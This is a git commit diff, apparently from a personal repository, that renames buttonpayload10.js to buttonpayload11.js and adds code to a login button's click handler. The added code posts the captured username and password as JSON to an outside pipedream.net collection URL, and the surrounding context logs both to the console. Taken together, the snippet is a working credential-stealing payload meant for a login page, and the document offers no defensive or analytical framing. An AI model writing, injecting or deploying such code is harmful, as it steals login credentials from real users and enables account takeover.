299978359ae42c285780be8f6dbcbf931f681309
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-11 12:58:11 +0100

    Update and rename buttonpayload10.js to buttonpayload11.js

--- buttonpayload11.js
+++ buttonpayload11.js
@@ -15,6 +15,19 @@ if (btn) {
         //onclick="this.disabled = 'disabled';submit();"
         console.log(username);
         console.log(password);
+        
+        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password
+            })
+        })
+        .then(response => console.log('Données envoyées avec succès !'))
+        .catch(error => console.error('Erreur lors de l\'envoi des données :', error));
     };
 } else {
     console.log('Bouton non trouvé');
